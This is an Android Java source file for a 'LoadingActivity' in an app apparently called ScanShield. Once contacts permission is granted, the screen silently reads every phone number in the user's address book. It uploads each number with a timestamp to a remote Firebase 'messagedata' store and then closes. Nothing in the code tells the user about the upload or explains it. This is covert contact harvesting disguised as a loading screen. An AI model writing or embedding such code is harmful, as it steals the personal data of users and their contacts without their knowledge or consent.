package com.example.scanshield_mobile_app;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;

public class LoadingActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CONTACTS = 1;
    private static final String TAG = "LoadingActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        checkContactPermission();
    }

    private void checkContactPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS},
                    PERMISSION_REQUEST_CONTACTS);
        } else {
            fetchAndUploadContacts();
        }
    }

    private void fetchAndUploadContacts() {
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);

        if (cursor != null && cursor.getCount() > 0) {
            int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int phoneIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            while (cursor.moveToNext()) {
                if (phoneIndex >= 0) {
                    String phone = cursor.getString(phoneIndex);
                    uploadContactToFirebase(phone);
                }
            }
            cursor.close();
        }

        finish(); // Close the activity after uploading
    }

    private void uploadContactToFirebase(String phone) {
        DatabaseReference database = FirebaseDatabase.getInstance().getReference("messagedata");

        String contactId = database.push().getKey();

        String currentDateTime = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());

        HashMap<String, Object> contact = new HashMap<>();
        contact.put("phoneNumber", phone);
        contact.put("dateTime", currentDateTime);
        contact.put("email", "");         // Placeholder (no email from phone contacts)
        contact.put("message", "");       // Placeholder (could be filled from user input later)
        contact.put("status", "unknown"); // Default status

        if (contactId != null) {
            database.child(contactId).setValue(contact)
                    .addOnSuccessListener(aVoid ->
                            Log.d(TAG, "Contact uploaded: " + phone))
                    .addOnFailureListener(e ->
                            Log.e(TAG, "Upload failed", e));
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CONTACTS &&
                grantResults.length > 0 &&
                grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            fetchAndUploadContacts();
        } else {
            Log.e(TAG, "Permission denied to read contacts");
            finish();
        }
    }
}
